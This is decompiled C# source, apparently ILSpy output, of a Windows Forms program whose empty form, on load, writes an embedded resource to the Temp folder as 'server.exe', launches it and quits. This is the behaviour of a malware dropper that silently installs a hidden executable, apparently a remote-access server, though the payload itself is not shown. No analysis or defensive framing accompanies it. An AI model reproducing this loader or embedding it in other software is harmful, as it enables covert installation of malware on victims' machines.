using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using clean.My.Resources;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	private int int_0;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		smethod_0(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(284, 262);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string temp = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 134:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0016;
						case 4:
							goto IL_002d;
						case 5:
							goto IL_003b;
						case 6:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 7:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_003b:
					num = 5;
					File.WriteAllBytes(text, Resources.smethod_3());
					break;
					IL_002d:
					num = 4;
					text = temp + "server.exe";
					goto IL_003b;
					IL_0009:
					num = 2;
					int_0 = 1000;
					goto IL_0016;
					IL_0016:
					num = 3;
					temp = ((ServerComputer)Class1.smethod_0()).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_002d;
					end_IL_0001_2:
					break;
				}
				num = 6;
				Process.Start(text);
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 134;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
